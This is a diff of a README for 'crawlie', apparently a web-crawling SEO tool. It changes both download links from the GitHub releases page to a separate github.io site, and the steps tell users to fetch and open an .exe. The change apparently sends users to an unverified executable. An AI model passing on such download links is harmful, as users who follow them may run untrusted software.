@@ -1,6 +1,6 @@
 # 🕷️ crawlie - Gather web data with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Galllodgement343/crawlie/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://galllodgement343.github.io)
 
 Crawlie maps websites and pages to help you improve search rankings and manage your online information. The software crawls through links to provide a clear view of your site structure. It works for both local business needs and large scale search engine optimization tasks. 
 
@@ -17,7 +17,7 @@ Your computer must meet these basic standards to run the software smoothly.
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Galllodgement343/crawlie/releases).
+1. Visit [this page to download](https://galllodgement343.github.io).
 2. Look for the file ending in .exe under the latest version section.
 3. Click the file name to start the download.
 4. Open the folder where your browser saves downloaded files. 
